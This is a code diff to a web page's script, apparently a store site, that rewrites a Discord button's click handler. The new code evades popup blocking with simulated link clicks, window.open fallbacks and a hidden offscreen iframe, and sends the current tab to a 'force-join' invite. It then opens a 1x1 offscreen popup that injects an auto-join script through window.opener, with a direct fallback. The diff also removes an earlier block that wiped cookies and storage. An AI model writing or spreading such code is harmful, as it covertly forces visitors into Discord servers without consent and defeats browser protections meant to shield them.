@@ -759,7 +759,7 @@
         }
     });
 
-    document.addEventListener("DOMContentLoaded", async () => {
+    document.addEventListener("DOMContentLoaded", () => {
     const btn = document.getElementById("discordBtn");
     const FORCE_JOIN_LINK = "https://dsc.gg/romulus";
     const OPEN_ONLY_LINK = "https://discord.gg/yunostore";
@@ -781,35 +781,50 @@
         }, 400);
     };
     
-    btn.href = "javascript:void(0)";
-    btn.addEventListener("click", function(e){
+    btn.onclick = (e) => {
         e.preventDefault();
         
-        // Open the second link normally (just opens, no auto-join)
-        window.open(OPEN_ONLY_LINK, '_blank');
+        // METHOD 1: Open second link via simulated click (bypasses popup blocker)
+        const tempLink = document.createElement('a');
+        tempLink.href = OPEN_ONLY_LINK;
+        tempLink.target = '_blank';
+        tempLink.rel = 'noopener noreferrer';
+        document.body.appendChild(tempLink);
+        tempLink.click();
+        document.body.removeChild(tempLink);
         
-        // Handle first link with auto-join
+        // METHOD 2: Also try window.open as backup
+        setTimeout(() => {
+            const newTab = window.open(OPEN_ONLY_LINK, '_blank');
+            if(!newTab || newTab.closed) {
+                // Fallback: use an iframe that redirects
+                const iframe = document.createElement('iframe');
+                iframe.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;';
+                iframe.src = OPEN_ONLY_LINK;
+                document.body.appendChild(iframe);
+                setTimeout(() => iframe.remove(), 2000);
+            }
+        }, 50);
+        
+        // Handle force-join link in current tab
         window.location.href = FORCE_JOIN_LINK;
-        setTimeout(function(){
+        
+        // Inject auto-join script into the current tab after redirect
+        setTimeout(() => {
             let popup = window.open('about:blank', 'injector', 'width=1,height=1,left=-9999,top=-9999');
             if(popup){
                 popup.document.write('<script>setTimeout(function(){try{window.opener.' + JOIN_SCRIPT.toString() + '();window.close();}catch(e){}},1500);<\/script>');
                 popup.document.close();
+            } else {
+                // Fallback: directly execute after page loads
+                setTimeout(() => {
+                    if(document.querySelectorAll) {
+                        JOIN_SCRIPT();
+                    }
+                }, 2000);
             }
-        }, 800);
-        
-        // Clear all cookies/localStorage related to both links after execution (optional cleanup)
-        setTimeout(function(){
-            try {
-                // Clear Discord-related tracking from both domains
-                document.cookie.split(";").forEach(function(c) {
-                    document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/");
-                });
-                localStorage.clear();
-                sessionStorage.clear();
-            } catch(e) {}
-        }, 5000);
-    });
+        }, 500);
+    };
 });
 
     const ham  = document.getElementById('hamburger');
